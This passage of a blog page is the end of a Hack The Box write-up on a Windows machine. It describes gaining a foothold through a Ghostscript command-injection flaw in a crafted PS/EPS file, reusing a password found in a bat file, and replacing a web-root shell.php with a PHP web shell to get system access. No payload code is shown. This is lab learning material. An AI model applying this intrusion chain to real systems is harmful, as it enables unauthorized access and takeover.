+<p>After reading the POC readme and following it through the exploitation occurs upon opening a PS or EPS file and can allow code execution cause by GhostScript mishandling permission validation for pipe devices, to delve deep check out <a href="https://www.vicarius.io/vsociety/posts/cve-2023-36664-command-injection-with-ghostscript">vsosciety_</a></p>
+<p><img loading="lazy" src="https://imgur.com/zJ8a8Gg.png" alt=""  />
+</p>
+<h2 id="windows-foothold">Windows Foothold.<a hidden class="anchor" aria-hidden="true" href="#windows-foothold">#</a></h2>
+<p>After sending the payload, we receive a connection back.</p>
+<p><img loading="lazy" src="https://imgur.com/kra6hpU.png" alt=""  />
+</p>
+<p><img loading="lazy" src="https://imgur.com/oNcq1q2.png" alt=""  />
+</p>
+<p>Navigating to the <code>/Desktop</code> directory we get the user flag.</p>
+<p><img loading="lazy" src="https://imgur.com/oNcq1q2.png" alt=""  />
+</p>
+<p>Further checking the <code>bat</code> file on the Documents directory we identify that there is an embedded password on the bat file.</p>
+<p><img loading="lazy" src="https://imgur.com/dKv1o8q.png" alt=""  />
+</p>
+<h2 id="enumerating-rpcclient">Enumerating RPCCLIENT<a hidden class="anchor" aria-hidden="true" href="#enumerating-rpcclient">#</a></h2>
+<p>Having the credentials and the information from our scans, <code>RPC</code> is open, trying out the creds we got on the bat file, we get access.</p>
+<h2 id="root-foothold">ROOT Foothold<a hidden class="anchor" aria-hidden="true" href="#root-foothold">#</a></h2>
+<p><img loading="lazy" src="https://imgur.com/3G18Iz7.png" alt=""  />
+</p>
+<p>Going back to the windows shell instance and enumerating further on the root directory there&rsquo;s a <code>xampp</code> directory which has <code>htdocs</code> where all the programs for the web pages will be stored.</p>
+<p><img loading="lazy" src="https://imgur.com/30Z8nOy.png" alt=""  />
+</p>
+<p>Notably, we can see there&rsquo;s a <code>shell.php</code> laying around. I replace the Content with that PHP Powny Shell.
+You will get a Shell as Administrator and finally the Root Flag.</p>
+<p><img loading="lazy" src="https://imgur.com/TXTDJdT.png" alt=""  />
+</p>
+<p>Checking out pownyshell we get <code>system</code> access.</p>
+<p><img loading="lazy" src="https://imgur.com/u0zg5rf.png" alt=""  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/htb/">Htb</a></li>
+      <li><a href="http://localhost:1313/tags/windows/">Windows</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/posts/tryhackme/stealth/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>stealth</span>
+  </a>
+  <a class="next" href="http://localhost:1313/posts/hacktheboo2023-ctf/forensics/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Hacktheboo 2023 CTF</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="http://localhost:1313/">OUHBOY</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
